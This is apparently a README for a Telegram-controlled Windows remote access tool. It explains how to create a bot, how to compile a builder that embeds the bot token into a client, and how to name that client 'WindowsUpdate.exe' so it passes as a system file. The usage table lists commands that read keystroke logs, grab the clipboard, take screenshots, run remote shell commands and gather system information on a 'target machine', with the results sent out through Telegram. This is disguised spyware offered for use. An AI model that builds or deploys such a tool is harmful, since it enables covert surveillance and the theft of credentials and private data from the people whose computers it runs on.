## üì¶ Installation & Setup

### Prerequisites

-   **Windows OS** (for building and running the client)
-   **Visual Studio** (with C++ development tools and the "Developer Command Prompt")
-   A **Telegram** account

### 1. Create Your Telegram Bot

1.  Open Telegram and search for `@BotFather`.
2.  Send the `/newbot` command.
3.  Follow the instructions to set a **name** and **username** for your bot (e.g., `my_test_bot`).
4.  **Save the API Token** provided by BotFather. It will look like this: `110201543:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw`.
5.  Send a message to your new bot. Then, visit this URL in your browser to find your **Chat ID**:
    `https://api.telegram.org/bot<YOUR_API_TOKEN>/getUpdates`
    Look for the `"id"` field inside `"chat"`.

### 2. Build the Project

1.  **Clone the Repository:**
    ```bash
    git clone https://github.com/your_username/your_repo_name.git
    cd your_repo_name
    ```

2.  **Compile the Builder:**
    Open a **Developer Command Prompt for VS** and navigate to the project directory.
    ```bash
    cl /EHsc builder.cpp
    ```

3.  **Run the Builder:**
    Execute the builder and provide the information it asks for.
    ```bash
    builder.exe
    ```
    -   Enter your Telegram Bot API Token.
    -   Enter your Admin Chat ID.
    -   Choose an output name for the client (e.g., `WindowsUpdate.exe`).

4.  **Get Your Client:**
    The builder will compile a new `client.exe` (or your chosen name) with your credentials embedded. **This is the file you deploy.**

## üñ•Ô∏è Usage

1.  **Deploy the Client:** Execute the custom-built client binary on the target machine (ensure you have permission!).
2.  **Interact via Telegram:** Send commands to your bot in Telegram:

    | Command | Description | Example |
    | :--- | :--- | :--- |
    | `/log [lines]` | Fetches the last X lines of captured keystrokes. | `/log 50` |
    | `/clipboard` | Fetches the current text content of the clipboard. | `/clipboard` |
    | `/screenshot` | Takes a screenshot of the target's desktop. | `/screenshot` |
    | `/shell <command>` | Executes a system command and returns the output. | `/shell whoami` |
    | `/sysinfo` | Gets basic system information (OS, user, etc.). | `/sysinfo` |
